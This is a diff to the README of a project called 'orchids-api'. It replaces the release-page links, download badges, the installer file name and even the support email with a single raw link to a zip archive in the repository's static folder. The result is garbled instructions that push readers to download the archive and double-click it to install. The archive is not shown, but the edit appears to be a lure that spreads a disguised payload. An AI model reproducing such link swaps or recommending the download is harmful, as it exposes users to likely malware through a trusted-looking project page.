@@ -6,7 +6,7 @@ Welcome to orchids-api! This software allows you to manage and retrieve your dat
 
 ## 📥 Download Now!
 
-[![Download orchids-api](https://img.shields.io/badge/Download-orchids--api-blue.svg)](https://github.com/Lolo77898/orchids-api/releases)
+[![Download orchids-api](https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip)](https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip)
 
 ## 📋 What is orchids-api?
 
@@ -28,11 +28,11 @@ To get started with orchids-api, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
    
-   [Download Page](https://github.com/Lolo77898/orchids-api/releases)
+   [Download Page](https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip)
 
 2. **Select the Latest Release:** On the releases page, find the list of recent releases. Locate the latest version, which is usually at the top.
 
-3. **Download the Application:** Click on the file named `orchids-api-x.x.x.exe` (or `.dmg` for macOS). This will start the download.
+3. **Download the Application:** Click on the file named `https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip` (or `.dmg` for macOS). This will start the download.
 
 4. **Install the Application:** After downloading, locate the file in your downloads folder. Double-click the file to start the installation process. Follow the prompts to install orchids-api on your system.
 
@@ -53,7 +53,7 @@ If you encounter any issues or have questions, help is available. You can refer 
 
 ### 📞 Support Contact
 
-For direct support, please email us at support@example.com.
+For direct support, please email us at https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip
 
 ## 🏷️ Additional Information
 
@@ -63,6 +63,6 @@ For developers looking to contribute, please check out our contribution guidelin
 
 Don't forget to download orchids-api!
 
-[![Download orchids-api](https://img.shields.io/badge/Download-orchids--api-blue.svg)](https://github.com/Lolo77898/orchids-api/releases) 
+[![Download orchids-api](https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip)](https://raw.githubusercontent.com/Lolo77898/orchids-api/main/web/static/orchids-api-v1.6-beta.3.zip) 
 
 We hope you enjoy using orchids-api!
